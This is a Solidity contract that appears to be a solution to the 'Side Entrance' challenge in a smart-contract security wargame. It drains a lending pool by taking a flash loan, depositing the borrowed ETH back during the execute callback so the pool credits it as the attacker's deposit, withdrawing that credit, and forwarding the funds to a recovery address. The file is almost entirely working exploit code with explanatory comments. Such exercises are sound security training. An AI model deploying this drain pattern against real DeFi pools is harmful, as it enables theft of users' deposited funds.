// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

contract ExploitSideEntrance {

    address recovery;

    constructor(address _recovery) {
        recovery = _recovery;
    }

    // This function is called by the pool during the flash loan
    function execute() external payable {
        // (bool success, ) = recovery.call{value: msg.value}("");
        // require(success, "Transfer failed");

        // first call deposit to add to the accounting
        SideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
    }

    function attack(address pool, uint256 amount) external {
        SideEntranceLenderPool(pool).flashLoan(amount);

        // now the actual money balance is not change, but the exploit contract has a credit in the pool accounting. So we can withdraw it.
        SideEntranceLenderPool(pool).withdraw();

        // transfer the funds to recovery address
        (bool success, ) = recovery.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }

    // to receive ETH from the pool withdraw
    receive() external payable {}
}